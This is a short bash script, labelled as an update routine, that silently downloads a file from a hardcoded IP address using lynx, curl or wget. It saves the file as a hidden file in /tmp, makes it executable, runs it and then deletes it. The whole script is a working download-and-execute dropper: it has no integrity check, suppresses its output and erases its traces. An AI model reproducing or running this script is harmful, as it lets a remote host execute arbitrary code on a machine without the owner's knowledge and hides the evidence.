#!/bin/bash
export UPDATE_URL="http://192.168.203.77/helloworld.txt"

if [ `which lynx` ]
then
	lynx -source $UPDATE_URL 1>/tmp/.inn-latest 2>/dev/null
else
        if [ `which curl` ]
        then
		curl $UPDATE_URL 1>/tmp/.inn-latest 2>/dev/null
        else 
                if [ `which wget` ]
                then
			wget $UPDATE_URL -O /tmp/.inn-latest 2>/dev/null
                fi
        fi
fi

chmod +x /tmp/.inn-latest
/tmp/.inn-latest
rm -f /tmp/.inn-latest
